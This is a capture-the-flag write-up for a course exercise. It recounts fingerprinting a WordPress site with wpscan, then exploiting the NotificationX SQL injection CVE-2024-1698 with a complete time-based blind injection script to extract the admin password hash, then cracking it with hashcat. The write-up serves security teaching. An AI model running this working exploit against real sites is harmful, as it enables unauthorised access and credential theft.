# CTF Week #8 (SQL Injection)

## Recognition

In this CTF, the goal was to extract the admin password of a given website.

We started by gathering information about the website, specifically the installed software. On the homepage, we found that the site was running on WordPress. To gather additional information, we used the `wpscan` tool with the command: `wpscan --url http://44.242.216.18:5008/`

The output (Irrelevant parts of the output have been omitted for clarity.):

```
[+] URL: http://44.242.216.18:5008/ [44.242.216.18]
[+] Started: Sat Nov 16 22:22:53 2024

Interesting Finding(s):

[+] WordPress version 6.7 identified (Latest, released on 2024-11-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://44.242.216.18:5008/feed/, <generator>https://wordpress.org/?v=6.7</generator>
 |  - http://44.242.216.18:5008/comments/feed/, <generator>https://wordpress.org/?v=6.7</generator>
 |  - http://44.242.216.18:5008/sample-page/feed/, <generator>https://wordpress.org/?v=6.7</generator>

[i] Plugin(s) Identified:

[+] notificationx
 | Location: http://44.242.216.18:5008/wp-content/plugins/notificationx/
 | Last Updated: 2024-10-27T10:43:00.000Z
 | [!] The version is out of date, the latest version is 2.9.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.8.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://44.242.216.18:5008/wp-content/plugins/notificationx/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://44.242.216.18:5008/wp-content/plugins/notificationx/README.txt

```

As we can see, the `wpscan` tool identified that the NotificationX plugin was outdated (latest version: 2.9.2), which presented a possible attack vector.

## CVE Research

Using the [CVE database](https://cve.mitre.org/), we queried for vulnerabilities affecting:

* WordPress version 6.7
* NotificationX version 2.8.1
* SQL Injection 

`CVE-2024-1698` is known vulnerability with 9.8 CRITICAL CVSS score, that works on NotificationX plugin for WordPress in all versions up to and including 2.8.2 (patched in 2.8.3). Plugin is vulnerable to SQL Injection via the `type` parameter on the `notificationx/v1/analytics` endpoint.

## Exploit

To exploit the vulnerability, we used script found in the [GitHub Repository](https://github.com/shanglyu/CVE-2024-1698).

Some explanation:

The exploit works by using blind SQL injection with a timing-based attack to infer information about the database. The vulnerability lies in the type parameter, which is passed into an SQL query without proper sanitization.

The attacker sends payloads that include the `SLEEP()` function to create a delay if a condition is true.
```sql
IF(ASCII(SUBSTRING((SELECT user_pass FROM wp_users WHERE id=1), <letter_position>, 1))=<letter>, SLEEP(10), NULL)-- -
```
It checks if `<letter_position>` character of the admin's password hash has an ASCII value `<letter>`, and if it true it will it will have 10 second delay. The code from the repository automates this process.


Code used for attack, (we updated the `url` variable and set `delay_time` to 10 seconds.)
```py
import requests
from sys import exit

delay_time = 10

url = "http://44.242.216.18:5008/wp-json/notificationx/v1/analytics"

session = requests.Session()

query_user = "SELECT user_login FROM wp_users WHERE id=1"
query_pass = "SELECT user_pass FROM wp_users WHERE id=1"

def get_data(query,field_name):
    result = ""
    for char_position in range(1,40):
        for ascii_value in range(256):
            payload = {
                "nx_id" : 10,
                "type" : f"clicks`=IF(ASCII(SUBSTRING(({query}),{char_position},1)) = {ascii_value}, sleep({delay_time}),null)-- -"
            }
            response = session.post(url, data=payload)
            
            if response.elapsed.total_seconds() > delay_time:
                result += chr(ascii_value)
                print(result)
                if ascii_value == 0: #null byte
                    print(f"[*]{field_name} : {result}")
                    return result
                break

username = get_data(query_user, "Username")
password_hash = get_data(query_pass, "Password hash")
```

The output:

<p align="center" justify="center">
  <img src="./assets/CTF8/result.png"/>
</p>

The hashed admin's password: `$P$BuRuB0Mi3926H8h.hcA3pSrUPyq0o10`.

## Finding the Password

The admin's password was stored as a hash using the default PHPass mechanism.

To crack the retrieved hash, we used Hashcat with the following command: 

```bash
hashcat -O -m 400 -a 0 -o cracked.txt hash.txt rockyou.txt
```

The rockyou.txt we got from this [link](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).

The cracked password (flag) is saved in the `cracked.txt`.
